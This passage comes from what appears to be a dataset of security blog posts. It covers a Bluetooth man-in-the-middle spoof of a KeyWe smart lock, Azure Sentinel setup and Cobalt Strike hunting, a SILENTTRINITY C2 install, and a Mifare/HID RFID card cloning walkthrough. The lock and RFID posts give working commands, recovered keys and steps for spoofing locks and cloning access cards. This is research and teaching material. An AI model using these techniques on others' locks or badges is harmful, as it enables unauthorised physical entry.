it is a randomized address. If the second digit is 2, 6, A, or E, it's a randomized Apple Device. (see diagram below)\n\nhttps://www.nctatechnicalpapers.com/Paper/2019/2019-mac-randomization-in-mobile-devices/download\n\nDevice #3 is our obvious target, conveniently indicated by the 'localName': KeyWe. The address type of the target device is 'public'.\n\nNow that we found the target we're interested in, we stop the scanning and issue command #2 on the Peripheral Pi, which is 'node scan -o 8C:C8:F4:0F:4C:93' This basically tells the Central-Pi to zero-in on the specified device based on its mac address ( in our case 8C:C8:F4:0F:4C:93 ) and explore all of the GATT Services and Characteristics. Again, this info is recorded to a \"services\" JSON file.\n\n(Click for full-size)\n\nFrom the above screenshots (Central Pi in particular), we can see some of the Unique Universal ID's (UUID), Handles and Properties (read, write, notify, etc), instrumental in facilitating incoming and outgoing packets. We can also see the GATT Characteristics and Descriptors, unique to some of the various GATT services available. Also, notice that the information that was discovered is saved to \u201cdevices/8cc8f40f4c93.srv.json\u201d.\n\nAt this point, we issue command #3 on the Peripheral Pi, 'sudo ./mac_adv -a devices/8cc8f40f4c93_KeyWe-8cc8f40f4c93.adv.json' and the Peripheral Pi changes it's BTD-400 adapter mac address to be that of the Lock and begins advertising at a very quick interval (every 20mS), thereby spoofing the actual lock.\n\n(Click for full-size)\n\nFrom the above screenshots, observe that the two JSON files created earlier are saved in the gattacker/devices directory. Also notice that the Peripheral Pi BTD-400 BLE adapter's address is  5C:F3:70:9C:F1:91 prior to issuing command #3 (sudo mac_adv). After executing command #3, we need to reset our adapter (\u201csudo hciconfig hci0 reset\u201d). We can now see that the BLE adapter's address has been changed to 8C:C8:F4:0F:4C:93 (our lock's address). \n\nAt this point, our Peripheral Pi is now spoofing the Lock's mac address and sending the lock's advertising beacons as recorded earlier, at a rate of every 20mS. Both the Central Pi and the Peripheral Pi are now armed and ready for the attack (as indicated by the \"INITIALIZED\" banner. The Peripheral Pi is now waiting for a connection request.\n\nThe victim opens the mobile app on his/her phone. The phone sees the (spoofed) lock's advertisement beacon and connects to the Peripheral-Pi.\n\nImmediately upon connection, the back and forth communication is intercepted, captured, and proxied in real-time between the phone and the lock. The entire session, including the unlocking of the door, is intercepted and recorded leaving the victim unaware that his/her session has been compromised.\n\n(Click for full-size)\n\nThe screenshot above shows the intercepted traffic. The Central Pi is displaying the JSON calls and the Peripheral Pi is displaying the actual incoming (write) and outgoing (read-notify) packet data. This screenshot represents just a snippet of the continuously scrolling session traffic. The packets color-coded in blue are the incoming (write) packets and the packets color-coded in green are the outgoing (read-notify) packets.\n\nSummary\n\nFor me, this proved to be a very informative and interesting attack option. In my previous attack with this smart lock, it required months of reverse engineering, dealing with heavily obfuscated code and updates, redacted security assessment tools, and deprecated Linux software modules. This MitM attack, after getting past the initial software and hardware preparation, takes literally no time at all to implement and does not require you to know anything about the security protocols in place or how the firmware operates!\n\nFurthermore, and most importantly, this attack platform can be moved to target any Bluetooth Low Energy device, without any changes to the MitM hardware or software! For example, if we wanted to target an August Smart Lock, a Yale Smart Lock, or any BLE smart device, the attack platform is ready to go! Just place your Central Pi as close to your targeted device as you can and place your Peripheral Pi in close proximity to your intended victim's device (phone, fob, etc). Fire up the Raspberry Pi's and you're off and running.\n\nIn closing, I want to say that I owned the smart lock and smartphone used in this proof of concept. Although I proved it can be done, it did require me to open the mobile app on my phone. In the real world, waiting for the victim to arrive home and open his/her mobile app to unlock the door would still allow us to capture the session, but unfortunately wouldn't allow us to replay the attack later without first reversing the mobile app. \n\nHowever, there are many commercially available smart locks that offer the \"auto-unlock\" feature, where the door will unlock when the owner is in close proximity to the lock. This a 'convenience feature'  that seriously undermines the lock's security, and if enabled in the mobile app, could be vulnerable to this type of MitM attack. In this case, placing the Central Pi close to the victim\u2019s home and sitting across from the victim in Starbucks might possibly be enough to get the phone to connect to our Peripheral Pi and unlock the door without actually opening the mobile app. This is a hypothetical example, and of course, would be highly illegal and strongly not recommended!\n\nThis was a fun project and it was very inexpensive to create this attack platform. The total cost for two Raspberry Pi's and two Kinivo BTD-400 BLE adapters was under $100 and well worth the investment. I highly recommend making the investment and experimenting with this MitM attack on one or more of your own personal Bluetooth Low Energy devices!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Azure Security Basics: Log Analytics, Security Center, and Sentinel\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale\"\nCreation Date: \"Tue, 24 Nov 2020 13:15:00 +0000\"\nJordan Drysdale //\n\nTL;DR\n\nThe problem with a pentester\u2019s perspective on defense, hunting, and security: Lab demographics versus scale. \n\nIf it costs $15 bucks per month per server for me to get ATP data, demo its effectiveness, provide tips, tricks, and some basic guidance to the world, this is affordable. Deploying ATP on 5,000 virtual servers on Azure is just shy of a million bucks a year, which to me, seems really expensive. But, I don\u2019t maintain any other EDR platform, so maybe it\u2019s cheap? I just don\u2019t know\u2026 But, I do know that Log Analytics, Sentinel, and ATP can produce a complete picture of your Azure authentication border defenses, virtual server happenings, and everything in between them. \n\nGetting Started (Log Analytics)\n\nThere is a terminology section at the bottom, and you may need to reference it to put together the complete picture. Deploy a VM, or deploy a lab (APT Lab via Terraform at the bottom), or make sure one of your existing resources is being monitored. Then, click over to Azure\u2019s Log Analytics workspaces dashboard. If you are planning to follow along, you can complete a lot of these steps on a demo environment maintained by Microsoft (linked below: DemoLogsBlade).\n\nAdd a new workspace, maybe a Resource group too if you want to keep things containerized.\n\nThe pricing tier question seemed obvious, but here it is anyway. \n\nFinally, click create. Once this is complete, we should have a Log Analytics dashboard.\n\nThere was much rejoicing, and we clicked \u201cGo to resource.\u201d\n\nFrom the navigation tree, scroll down to Logs. \n\nThen, we land on the Logs dashboard, which on the left, we find the LogManagement schema. The Microsoft definition basically says the schema is a \u201c...collection of tables grouped under logical categories.\u201d The default, as shown, only has a few Tables. But, this will update akin to Elastic\u2019s log index growth when we add new event sources. Also highlighted is the queries pane which we will see again after a while. \n\nFor documentation\u2019s sake, an out-of-the-box schema appeared as follows.\n\nLet\u2019s add some log sources -- which the Azure platform facilitates with a few clicks. First up, let\u2019s get our VMs connected to the Event Analytics workspace. \n\nNavigate to Home > Log Analytics Workspace > EventAnalytics-WS1 > under Get Started with Log Analytics, find 1. Connect a data source then click on Azure virtual machines. \n\nFurther disclosure, the VMs listed below were deployed using the Terraform script from here. (We\u2019ll have a blog about that soon too!)\n\nClick on any of the virtual machines listed in this panel. \n\nClick Connect. About five minutes, and the systems are connected. \n\nNext up, install the Log Analytics Agent. Navigate to Home > Security Center > Getting Started > Install Agents tab. Check the appropriate boxes for your subscriptions and click Install Agents. \n\nThis function will install the Log Analytics agent on these systems. It takes just a few, so feel free to freshen your tea.\n\nEvents, Event Handling, and Our First Optics\n\n(Caution: Inbound Charges are Likely)\n\nTo gather the first set of Security Events, we need to enable them, and that costs money. Proceed with consideration for your own wallet. We will summarize the charges at the end of the blog for this effort. This includes spinning up an APT Lab of three VMs, which cost about $2.40 per day each. This will include the Pay-As-You-Go pricing for log consumption.\n\nNavigate to Home > Security Center > Pricing & Settings.\n\nOnce there, the first thing I did was Disable Auto-Provisioning. This will keep all the future VMs I deploy from magically costing money without interaction. \n\nIt\u2019s time to enable Standard tier pricing. This will enable the event management we need to start seeing events in our log analytics dashboard. \n\nNavigate to Home > Security Center > Pricing & Settings. \n\nEdit the workspace created during this process and switch the pricing over to standard so we can enable all events. \n\nNext, navigate to Home > Security Center > Pricing & Settings > Continuous Export. Here we need to enable the appropriate Exported data types. \n\nAt this point, we should have some initial events.\n\nNext Up, Azure Sentinel\n\nNavigate to Home > Sentinel. Click Add. \n\nNext up, add the workspace. \n\nOnce everything was connected, getting Sentinel online was just a couple of clicks. \n\nAnd thus begins our hunt operations on Azure. So many questions left to address, so many directions to go, and so many events to search. \n\nThe next blog, already in the works, is to deploy this via Roberto\u2019s work (OTRF) on AzureSentinel2Go. This is one of my favorite logos...\n\nTerminology\n\nTenant - Accounts and Groups\n\nSubscription - Agreement with Microsoft\n\nVM - virtual machine on Azure space\n\nLog Analytics - Logging dashboard for Azure\n\nLog Analytics Agent - installed on VMs for event integration\n\nATP - Advanced Threat Protection, expensive, but holy amazing\n\nLinks \n\nhttps://docs.microsoft.com/en-us/azure/azure-monitor/log-query/get-started-portal\n\nhttps://ms.portal.azure.com/#blade/Microsoft_Azure_Monitoring_Logs/DemoLogsBlade\n\nhttps://docs.microsoft.com/en-us/azure/security-center/security-center-enable-data-collection\n\nhttps://docs.microsoft.com/en-us/microsoft-365/enterprise/subscriptions-licenses-accounts-and-tenants-for-microsoft-cloud-offerings?view=o365-worldwide \n\nhttps://docs.microsoft.com/en-us/connectors/azureloganalyticsdatacollector/ \n\nhttps://github.com/OTRF/Azure-Sentinel2Go (next up, deployed, and in queue)\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Azure Sentinel Quick-Deploy with Cyb3rWard0gs Sentinel To-Go - Lets Catch Cobalt Strike!\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale\"\nCreation Date: \"Wed, 02 Dec 2020 13:04:00 +0000\"\nJordan Drysdale //\n\ntl;dr\n\nSentinel is easy! Especially when using Azure Sentinel To-Go. So, let\u2019s do some threat research by deploying Sentinel To-Go and executing a Cobalt Strike beacon.\n\nLink: https://github.com/OTRF/Azure-Sentinel2Go\n\nKeeping up with Roberto\u2019s (and his brother, and the OTRF contributors) is as monumental a task as his efforts to push threat research forward. The Defensive Origins team (jeez, we\u2019re four now, and hopefully five soon) do our best to find items to improve general security posture and share them.\n\nBackground: \n\nRoberto (Cyb3rWarD0g) and several other folks at OTRF are contributing so much to the security community, researchers, and the world in general that we cannot muster enough time to keep up. Things they\u2019ve made available: years of endpoint research, HELK, Mordor, OSSEM, tons more, and the Sentinel easy buttons. So, let\u2019s all thank Roberto, his fam, and OTRF. Thank you all, for all your efforts. \n\nForeground:\n\nOur research today will focus on the research itself\u2026? We take our security seriously and have lately been spending a ton of time in the cloud. Since \u201ccloud\u201d, \u201ccloud security\u201d, and \u201ccobalt strike\u201d are all terms that resonate with C-Level, we invest our hard-fought research cycles to make sense of the terminology. So, using the work of industry giants, let\u2019s take a swing at deploying Sentinel, spinning up some VMs with Azure resource manager templates, and executing a Cobalt Strike (licensed) beacon or two. \n\nWe should start with an authenticated session to Azure in one tab, and the Sentinel To-Go repo in another.\n\nhttps://portal.azure.com\n\nhttps://github.com/OTRF/Azure-Sentinel2Go\n\nAs shown in the next screenshot, feel free to click the button for whatever makes sense to you, but I went with the AZ Sentinel + WS + DC build. \n\nThere are lots of options to sort out on the deployment page. You can edit the template, parameters, add VMs, basically customize thoroughly. \n\nThe next image shows the resource group configuration, which was pre-existing in our case. \n\nUser and access configuration is shown in the next screenshot.\n\nSystem, domain, and event logging configuration is shown in the next screenshot. An item of note is marked in the next screenshot. This is where you determine the level of logging you wish to collect for the duration of this build. I chose \u201cAll\u201d - give me everything and I\u2019ll sort it out.\n\nNext up, the Ubuntu SKU. Defaults.\n\nCreate. Accept. Billing is inbound and costs approximately 1 - 3 US dollars per run for me, which is in the order of 10-15 hours. Last run? $2.21.\n\nDisregarding the setup of Cobalt Strike, I am using a licensed version for this effort. An initial beacon was established on the workstation.\n\nThen, we run ipconfig, perform a quick portscan, identify another target, and jump/spawn a new beacon with psexec64. \n\nFrom our Azure Sentinel workspace, we click on the Hunting navigation pane. There are quite a few interesting pre-packed queries ready to-go. Once we have data, the hunt should be interesting.\n\nThe pre-packed query I used to find the Cobalt Strike activities was the \u201cLeast Common Parent and Child Process Pairs.\u201d \n\nAfter some investigations, we discovered the commands used for lateral movement:\n\ncmd to spawn ipconfig\n\nipconfig to identify local network\n\nservices to launch the secondary beacon\n\nrundll32 to spawn an additional beacon (what is opsec? what is opsec in a lab?)\n\nThere were other interesting IoCs as we drilled through the Sentinel Hunting queries. The next window includes \u201cPowerShell Downloads.\u201d These are non-standard calls from a PowerShell prompt, to be sure. \n\nThere is another query for \u201cEncoded Commands\u201d \n\nThis query also caught some interesting executions. \n\nLet\u2019s bottom line this thing. Azure Sentinel can retrieve logs from our endpoints per defined constructs - meaning, we can tell the Sentinel endpoint agent to grab Sysmon, Security, PowerShell, and WMI logs. This is super cool. \n\nSentinel To-Go is a great way to start learning the Sentinel dashboards and how these bits and pieces all fit together. Like everything, some of these queries can likely be subverted with naming scheme changes, et cetera\u2026..but, some of these queries would be a challenge to avoid. \n\nKeep hunting, securing, and being safe. Take care!\n\nPS: This hunt cost US$1.53.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Joyriding with SILENTTRINITY - UPDATES\"\nTaxonomies: \"Author, Fun & Games, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale\"\nCreation Date: \"Thu, 10 Dec 2020 13:19:00 +0000\"\nJordan Drysdale //\n\ntl;dr\n\nSILENTTRINITY (ST) is one of our favorite C2 tools at BHIS. It's multiplayer, modern, and multiserver. The code has been revised significantly of late, especially the installation... and the instructions in the original blog I wrote are no longer accurate.\n\nhttps://www.blackhillsinfosec.com/my-first-joyride-with-silenttrinity/\n\nAlso, please read the call to arms. Help and support for open source is needed. \n\nhttps://porchetta.industries/2020/11/17/And-Now-For-Something-Completely-Diffrent/\n\nWe all know tools change, grow, and update over time\u2026and blogs do not without intervention. At this point, the original blog on joyriding with ST is inaccurate. And, that\u2019s okay. So, the following instruction set will provide the fastest path to getting the teamserver operational. The same instructions work for the SILENTTRINITY (ST) client (and CrackMapExec and other modernized Python tools). At a super high-level, you need a sane Python environment, 3.8+ is best, and the ST binary.\n\nThe steps are listed below, should be easy to follow, and took about 15 minutes to document. \n\nStep 1: Deploy your image (Digital Ocean shown below). \n\nStep 2: Check your Python version, it should be Python3.8.\n\nStep 3: Navigate to the Github repo\u2019s Actions tab here: \n\nhttps://github.com/byt3bl33d3r/SILENTTRINITY/actions\n\nStep 4: Download latest.\n\nStep 5: Unpack and execute (python3 st --port 81 178.128.155.142 password).\n\nThat\u2019s it. The teamserver is up and running. \n\nCheers and good luck out there. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"RFID Proximity Cloning Attacks\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch\"\nCreation Date: \"Thu, 17 Dec 2020 13:10:00 +0000\"\nRay Felch //\n\nIntroduction\n\nWhile packing up my KeyWe Smart Lock accessories, and after wrapping up my research and two previous blogs \"Reverse Engineering a Smart Lock\" and \"Machine-in-the-Middle BLE Attack\", I came across a couple of KeyWe RFID tags. Although I was somewhat already familiar with RFID (Radio Frequency ID) technology, I decided this might be the perfect opportunity to not only close out my Smart Lock research but also take a deeper dive into this fascinating method of wireless communication.\n\nFollowing the steps in my KeyWe Lock setup guide, I programmed one of the RFID tags and verified that it successfully unlocked the door by simply bringing the tag within a few centimeters of the lock. Armed with a working RFID tag, I began my journey into a deep dive of RFID research.\n\nHID ProxMark cards and tags\n\nOperating at 125kHz (low frequency), the older proximity cards (or Prox card) allowed contactless smart cards to be read within a few inches of the reader. This was a welcome improvement to swiping a card in a magnetic stripe card reader. Not much later, a second generation of cards (HID ProxMark II) offered an even greater range of up to 15 inches. With this came the ability to leave the card in a wallet or purse, which could then be held up to the reader to gain access. These earlier cards were comparable to magnetic stripe cards, in that they could not hold much data and were typically used as key-cards for access control doors in office buildings. These older low-frequency cards basically offered up a 26 bit-stream when brought in close proximity of the reader. This afforded an 8-bit Facility Code, a 16 bit Card ID, and 2 parity bits. This huge limitation with regard to data storage made way for the extremely popular high frequency (13.56MHz) Mifare Classic card.\n\nPassive and Active RFID cards\n\nThere are two types of contactless RFID cards, passive and active. In general, these cards contain an IC (integrated circuit) and an antenna. With passive cards, the  IC is not internally powered but instead derives its power in the form of mutual inductance, (known as 'resonant energy transfer') from the 'powered' reader module. When placed in close proximity to the reader, the chip inside of the passive card wakes up and sends a stream of data to the reader. The antenna on these cards is made from a number of tightly wound loops of wire, running around the perimeter of the card.\n\nActive RFID cards and tags (sometimes referred to as vicinity cards) contain an internal lithium battery which can provide for even greater reading distance, generally in the order of 2 meters (6 feet). In some rare cases, RFID Active tag's range can be upwards of 150 meters (500 feet).  A use-case for this type of tag might be when needing to be read from within a vehicle, as it approaches a security gate. The battery in these active tags has a life cycle of 2-7 years, at which time the tag would need to be replaced. \n\nMIFARE cards and tags\n\nNXP Semiconductor ( a 2006 spin-off company of Philips) owns the trademark on MIFARE RFID cards. The MIFARE card technology was created as a consequence of consumer wide acceptance of the older HID ProxCard technology while addressing issues like the limited data capacity and the serious lack of security that the older cards afforded. At the time of this writing, it appears that there are over 10 billion smart cards and over 150 million smart card reader modules in existence.\n\nWhile the majority of the older HID ProxCards operated at 125kHz, the newer MIFARE cards were designed to be operated at 13.56MHz (high frequency). These contactless cards provided a significant improvement with regard to data storage, offering versions with 1k and 4k bytes of storage. The MIFARE card (ISO 14443 A/B compliant) also implements a proprietary (NXP) encryption algorithm known as Crypto1 with 48-bit keys on its MIFARE Classic 1k card. Unfortunately, as is typically the case with creating custom crypto, Crypto1 has since been compromised and is vulnerable to nested and hardnested brute force key guessing attacks.\n\nIn the continued pursuit of better contactless card security, MIFARE introduced the MIFARE Plus and MIFARE DESFire (high security) cards, along with the MIFARE Ultralight card. The MIFARE DESFire card's chip has a full microprocessor and much-improved security features, such as Triple DES encryption standards.\n\nThe MIFARE DESFire and MIFARE Classic EV1 (latest) card contain an on-chip backup management system and mutual three pass authentication. The EV1 can hold up to 28 different applications and 32 files per application.\n\nChinese magic cards\n\nThe (13.56MHz) MIFARE Classic 1k cards are some of the most widely used RFID cards in existence. Based on ISO14443 A/B standard, these cards are relatively inexpensive at approximately $1 each.\n\nMIFARE Classic 1k contactless smart cards offer 16 sectors, with each sector containing (4) 16-byte blocks, for a total of 1,024 bytes of on-card storage. Sector 0 typically read-only and contains such information as the UID, access bits and manufacturer info, etc. In order to successfully clone a card or tag in its entirety, sector 0 needs to be writable so that we can overwrite the card's factory-set UID and related data. \n\nThe appropriately named Chinese Magic Card allows for sector 0 writing, with re-writing capability advertised in the order of 100,000 times. There are many sector 0 writable cards in production, but it's buyer beware when it comes to reliability, so use due diligence when making your purchases.\n\nMIFARE Classic 1K card sector 0 configuration\n\nRFID Reader / Writers\n\nThe Proxmark3 is a powerful general-purpose RFID tool designed to snoop, listen, and emulate everything from Low Frequency (125kHz) to High Frequency (13.56MHz) cards and tags. Moderately expensive at $270, this is a definite must for any serious RFID researcher's toolbox! Installation of the software can be a bit of a chore, however, after a few attempts, I discovered that following the instructions of Iceman's fork I was up and running in practically no time.\n\nThe NFC ACR122U is a cost-friendly option for high frequency (13.56MHz) reading, writing, and cloning. Not only supported with useful open source software, but the reader/writer can also be interfaced with the NFC (near field connection) features of NFC compliant mobile phones.\n\nThe Easy MF RFID Reader/Writer (13.56MHz only) is something that I stumbled upon while researching the many options available for my RFID project. At $25, this device is very inexpensive, however, it does come at a cost. The setup and operating instructions were very difficult to follow (due to Chinese translation issues) and it did take some time to get up and running. It does offer a web-socket GUI, but even accessing the GUI is somewhat opaque in my opinion. That being said, I eventually was able to read and write data on a few Mifare Classic 1k cards.\n\nThe RFID-RC522 Reader/Writer is an extremely inexpensive (just $3) circuit board designed to be easily interfaced with the Arduino line. Searching the internet, there are many Arduino based RFID projects available to experiment with reading and writing to RFID (high frequency (13.56MHz) cards and tags. I'll present a few of these projects later in this write-up.\n\nThe Handheld RFID Writer Is another very inexpensive device that makes it incredibly easy to clone HID (low-frequency 125kHz only) cards and tags. This handheld reader/writer is powered by a couple of AAA batteries. Simply power the device using the on/off switch on the handle. Hold the source card to the reader (top-left), press the READ button, and wait for the green (pass) LED to light. Replace the source card with the target card, press the WRITE button, and wait for the green (pass) LED to light.\n\nLong Range Readers\n\nWhile the more common card reader systems have a very short range, measured in inches, the HID MaxiProx 5375 and HID R90 long-range readers can operate at a range of up 6 ft (and over 25 ft. when used with the HID ProxPass Active card). These readers work really well when you want to open a gate to a parking garage from your vehicle. The HID R40 iClass SE is a Multiclass Reader typically used for access control with a range of approximately 5\" (varies depending on the type of iClass card).\n\nThe HID MaxiProx 5375 long range reader (125kHz) HID ProxCard II\n\nThe HID R90 long range reader (13.56MHZ) HID iClass \n\nThe HID R40 Wall Unit (13.56 MHz) HID iClass SE\n\nOne thing that all readers (both short-range and long-range) have in common is that after receiving the bit-stream from the RFID card or tag, they communicate with an access controller (typically PC based) to forward the information for confirmation (or denial) of access. Wiegand https://en.wikipedia.org/wiki/Wiegand_interface refers to the technology used in card readers and sensors dating back to the early 1980s. This system is a wired communication interface that uses a minimum of three wires, GND, Data-0, and Data-1/CLK.  The original Wiegand format had one parity bit, 8 bits of facility code, 16 bits of ID code, and a trailing parity bit for a total of 26 bits.\n\nA parity bit is used as a very simple quality check for the accuracy of the transmitted binary data. The designer of the format program will decide if each parity bit should be even or odd. A selected group of data bits will be united with one parity bit, and the total number of bits should result in either an even or odd number.\n\nIn the example above, the leading parity bit (even) is linked to the first 12 data bits. If the 12 data bits result in an odd number, the parity bit is set to one to make the 13-bit total come out even. The final 13 bits are similarly set to an odd total.\n\nProxmark3 Session: KeyWe RFID Tag\n\nImage 1 (above) shows the Proxmark3-RDV2, one 'sector 0 writable' (magic card), and a pre-programmed KeyWe Smart Lock RFID tag. The KeyWe RFID tag is a high frequency (13.56MHz) device. The Proxmark3 is oriented in a manner that exposes the 13.56MHz coiled antenna (125kHz side faced down).\n\nImage 2 (above) shows the KeyWe RFID tag positioned to be read\n\nImage 3 (above) shows the sector 0 writable card positioned to written to (cloned)\n\nMifare Classic 1k cloning procedure\n\nPlace the KeyWe RFID on the Proxmark3 high frequency (13.56MHz) coil as per Image-2\n\nOpen a terminal and navigate to /proxmark3/client/\n\nSearch card\n\nThe following screenshot shows us performing a high-frequency search of the KeyWe RFID tag. The results of this search provide us with the UID (unique identification), the ATQA (answer to request ), and SAK ( select acknowledgment). As noted earlier, a SAK value of 08 indicates that the tag follows the Mifare Classic 1k (ISO14443A) standard. The ATQA value is an indication of the UID byte length, in this case, 4 bytes.\n\nCheck keys\n\nNow that we have determined we have a Mifare Classic 1k tag, we can check the tag for all of the known A and B keys and determine if any are missing. This check is performed using a default list of known keys, but can also be modified to look for specific hand-entered keys as well.  You need all keys to make use of the 'hf mf dump' command.\n\nNested attack\n\nFind missing keys using a nested attack and known good key. From the screenshot we can see that using a known key \"ffffffffffff\", the missing A-key: 9b7c25052fc3 was discovered, as well as B-key: c22e04247d9a. We now have all of the keys (saved to dumpkeys.bin) and we can successfully clone the card.\n\nRestore\n\nRemove the KeyWe RFID tag from the Proxmark3, and place a sector 0 writable card on the Proxmark3 as per Image-3. A quick search shows the UID of this card to be factory set to 'b6 dd 33 3d'. Also, notice the card was detected as a Chinese magic backdoor (GEN 1a) card. Continuing on with the 'restore' command, we can see that the Proxmark3 is dumping the data previously read and saved to dumpdata.bin, to the writable card. Also notice, that the first block of sector 0 (containing the UID,  etc) can not be written at this time. This is because this particular type of sector 0 writable card requires a special unlock command prior to the write. This is normal and will be addressed shortly when we issue the \"csetuid\" command.\n\nSet UID\n\nAfter successfully writing the remaining blocks (1-63), we can issue a special command to unlock 'sector 0 - block 0' in order to write the UID, access control bits, and manufacturer info (see the following screenshot). We issue the \u201ccsetuid\u201d command using the known KeyWe RFID tag's UID: 01 8a 44 54. Following up with another quick search indicates the UID now matches the original KeyWe RFID tag. Testing this cloned card using the KeyWe smart lock proves that we successfully cloned our original tag.\n\nTesting cloned RFID card\n\nAlternative Reader/Writers \n\nAlthough the Proxmark3 is a definite 'must-have' for all RFID toolkits, it might not be a viable \"entry-level\" option for those that want to experiment with RFID technology. That being said, there are many alternative options with regard to NFC and HID card readers and writers. In the following sections, I'll touch on three relatively inexpensive ways to accomplish similar results to that of the Proxmark3. Specifically, will visit using the NFC ACR122U card reader/writer, an Arduino Nano/RC522 based tool, and an Android phone to read and write to Mifare 1k Classic cards.\n\nNFC ACR122U Reader/Writer using open source mfoc-hardnested tool and nfc-tookit\n\ngit clone https://github.com/nfc-tools/mfoc-hardnested\n\nautoreconf -vistool \n\n./configure\n\nmake && sudo make install\n\nPlace original RFID tag on reader\n\nExecuting mfoc-hardnested -O mykeywecard.mfd -k ffffffffffff dumps the tag information including known keys to the output file \"mykeywecard.mfd\". This command requires that at least one key be known (in this case, the default key 'ffffffffffff' was used). First, an attempt to authenticate all sectors using a table of default keys will be performed. As can be seen, by the screenshot below, keys were found for all sectors of the KeyWe tag, except for sector 10.\n\nAt this point, the process continues with a hardnested brute force attack to determine (guess) the two remaining keys (A/B).  As per the screenshot below, we can see that Key A was found, and data read with Key-A revealed Key-B. Now that all sectors have been authenticated, the keys will be dumped into the file.\n\nAs can be seen below, sector 10 contains blocks 40 - 43 and the key that authenticates the sector for read/write is \"9b7c25052fc3\"\n\nSector 0 (comprised of blocks 0 - 3) contain the UID, followed by BCC (checksum), SAK (card type), ATQA and Manufacturer Info\n\nReplace KeyWe RFID tag with Blank Chinese Mifare card\n\nExecuting nfc-mfclassic w b mykeywecard.mfd pulls the data/keys dumped to the file mykeywecard.mfd and writes this information to the target card. Examining the screenshot more closely shows that 63 of 64 blocks written! This is because sector 0 is read-only. Although we are using a Chinese Magic Card, it is a Gen-1 (generation one) card and requires a special unlock command (0x43 0x40) to be sent prior to writing block-0. As can be seen, the factory set UID of the magic card (6d 94 94 3d) has not been modified. Had we used a Gen-2 card we would be done cloning. Fortunately, we can issue the unlock command by executing nfc-mfsetuid 018a4454. This will modify the magic card UID to reflect the KeyWe tag's UID of 01 8a 44 54.\n\nWe now have a working copy of the original KeyWe RFID tag!\n\nCost effective learning option\n\nFortunately, experimenting and understanding RFID technology can be accomplished by utilizing an extremely inexpensive Arduino Nano board with an RFID-RC522 reader/writer circuit board, and a couple of open-source Arduino sketches. There is an enormous number of practice labs, complete with sketches and wiring diagrams, available for learning the basics. After examining quite a few of these options myself, I've decided to include a couple of my favorites for this write-up.\n\nArduino Nano v3 with RFID-RC522 (cost $8)\n\nhttps://www.arduino.cc/en/software\n\nhttps://github.com/miguelbalboa/rfid  (Arduino rfid library)\n\nDumpInfo sketch  (dumps the contents of a Mifare Classic card to a serial console)\n\nReadAndWrite sketch  (demonstrates reading some data, modifying and writing it back, and verify)\n\narduino_code_for_rfid_reader sketch  (demonstrates using an RFID card or tag for access control authentication)\n\nI've included a color-coded diagram of my hardware setup (above), as well as a few pictures (below) in order to make assembly quick and easy.\n\nExample 1: Read Card and Dump Info to serial port\n\nIn the above example, all of the sectors (except sector 0 below) contain the same info\n\nExample 2: The following Arduino sketch (\"ReadAndWrite\") reads a card (or tag) into memory, writes some test data to sector 1, block 4, and then performs another read to verify the data has changed.\n\nExample 3: The following short Arduino sketch (\"arduino_code_for_rfid_reader\") reads a card (or tag) to obtain the UID and verifies that the owner is \"authorized access\" by comparing it to a legitimate UID within the code. In this example, the \"legitimate access UID\" is \"75 56 33 3D\"\n\nAndroid Tools to clone Mifare 1k Classic cards\n\nIt is also entirely possible to use an NFC compliant Android phone to successfully read, write, and copy Mifare RFID cards and tags. There are many apps available to download from Google Play Store. In my opinion, two of the more popular apps are NFC Tools developed by wakdev and MIFARE Classic Tool developed by ikarus23.\n\nNFC enabled phones can ONLY read passive high-frequency RFID (13.56MHz) cards and tags, and they must be read at an extremely close range, typically within a few centimeters. Simply holding a high-frequency Mifare card to the underside of an NFC enabled phone will prompt you to choose from existing apps or tools currently available on your phone (see below). Choosing NFC Tools would display the results of reading the card.\n\nMCT (Mifare Classic Tool)\n\nIt's relatively easy to clone a Mifare Classic card using the MCT Mifare Classic Tool   \n\nhttps://github.com/ikarus23/MifareClassicTool  - Available for download at Google Play Store.\n\nImportant information: To successfully write to sector 0, the target Chinese Magic Card must be a Gen-2 version card. Gen-1 cards require an unlock code (0x43 0x40) to be sent for writing sector 0, and MCT does not send unlock codes for sector 0 writes.\n\nUsing the MCT mobile app to clone\n\nFollowing the steps shown below, we can clone Mifare Classic cards and tags using any NFC compatible android phone (no iOS support at the time of this writing). For this example our source card will be Mifare 1k Classic card with UID \"0EFF84C1\" and our target card will be Chinese magic card Gen-1 with UID \"60FA353D\".\n\nOpen App and place source card against the underside of your NFC enabled phone\n\nRead Source by tapping \"READ TAG\", followed by \"START MAPPING AND READ TAG\"\n\nEdit Dump by tapping sector 1, change first 6 bytes from 000000 to 123456, place target card against the underside of your phone\n\nWrite Target by tapping the \"3 dots\" drop-down menu and select \"WRITE DUMP\", \"WRITE DUMP\", \"OK\", \"START MAPPING AND WRITE DUMP\"\n\nRead/Verify Target by tapping \"READ TAG\", followed by \"START MAPPING AND READ TAG\"\n\nNotice that although we successfully changed the bytes in sector 1, the source UID did not get written to sector 0 due to our target card being a Gen-1 magic card. Many times the UID of the card will be verified before allowing access or confirming the legitimacy of the card. In this case, to complete this clone we can use the NFC ACR122U Reader/Writer mentioned earlier, to issue \"nfc-mfsetuid 0eff84c1\" and change the UID of the target card to be that of the source card. Likewise, we could have also used a Gen-2 magic card, to begin with.\n\nIt should also be mentioned that we did not have any \"missing keys\" in our example. Had there been encryption keys that MCT was not aware of, writing to those specific sectors would fail. There are a few ways around this issue. If we already know the keys, we can enter them into a \"keys file\" within MCT.\n\nAs shown in the diagram above, we can click \"EDIT/ADD KEY FILE\" - \"std.keys\" and tap to enter (edit) our known keys\n\nAlternatively, we could create a text file containing our keys and enter them into MCT by clicking \"TOOLS\" - \"IMPORT/EXPORT FILES\" - \"IMPORT KEYS\"\n\nFinding unknown keys\n\nIf the \"missing\" keys are not known there are open source Linux-based tools (MFCUK and MFOC) available to brute force attack and guess the key(s). These tools provide two methods for cracking encryption keys on a MIFARE Classic smart card.  Note: These tools, as well as many other useful tools, are available for download 